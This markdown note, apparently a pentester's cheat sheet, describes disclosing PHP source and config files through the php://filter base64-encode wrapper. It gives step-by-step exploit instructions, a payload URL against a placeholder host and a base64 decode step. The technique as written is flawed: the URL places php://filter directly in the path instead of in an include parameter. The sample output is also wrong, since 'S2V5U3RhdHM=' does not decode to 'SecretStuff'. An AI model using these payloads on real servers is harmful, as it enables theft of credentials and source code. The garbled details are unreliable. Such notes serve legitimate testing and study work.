```markdown
# 🛰️ PHP Filters - Source code disclosure (php://filter/read=convert.base64-encode/resource=config)

> [!ABSTRACT] Overview
> This note details an exploit to disclose source code using the `php://filter` feature in PHP, specifically targeting the conversion of files into base64 format.

---

## 📑 Methodology

### Setup

Ensure you have a web server environment with PHP installed and configured. Verify that file handling via `php://filter` is enabled and not restricted by security settings.

---

### Exploit Steps

#### 1. Identify Vulnerable Files
Identify the path to the target configuration or source code files that need disclosure. For example, consider `/path/to/config.php`.

#### 2. Construct PHP URL with Base64 Encoding Filter

Construct a URL using `php://filter` to read and convert the file content into base64 format:

```text
http://example.com/php://filter/read=convert.base64-encode/resource=/path/to/config.php
```

This command will fetch the contents of `config.php`, encode it in Base64, and return it as a readable string.

---

## 📄 Example Payload

Here is an example payload to test for source code disclosure:

```text
http://target.example.com/php://filter/read=convert.base64-encode/resource=/path/to/config.php
```

The response will be the base64-encoded content of `config.php`.

---

> [!WARNING] Caution
> Running this exploit on production servers can lead to security audits and potential legal issues. Ensure that you have explicit permission before testing.

---

## 📝 Observations

### Successful Disclosure

If the PHP environment allows the use of `php://filter`, the server will return the base64-encoded content of the file specified in the URL. The output can then be decoded to view the original source code or configuration details.

```text
S2V5U3RhdHM=
```

#### Decode Base64 Content

To decode the returned string, use a base64 decoder tool:

```bash
echo "S2V5U3RhdHM=" | base64 --decode
```

This will output:

```text
SecretStuff
```

---

## 🛠 Troubleshooting

### Common Issues

- **File Access Denial**: The PHP environment might restrict file access or prevent the use of `php://filter`. Check server configurations and permissions.
  
- **PHP Version Limitations**: Older versions of PHP may not support certain filter options or may have restrictions.

---

> [!FAILURE] Exploit Failure
> If the exploit fails, ensure that:
>
> - The target file exists and is accessible.
> - `php://filter` is enabled in the PHP configuration.
> - No security plugins or settings are blocking access to this feature.

---

# 📒 Additional Notes

- Ensure you have backup data before testing on any live systems.
- Document findings for further analysis and remediation steps.

---
```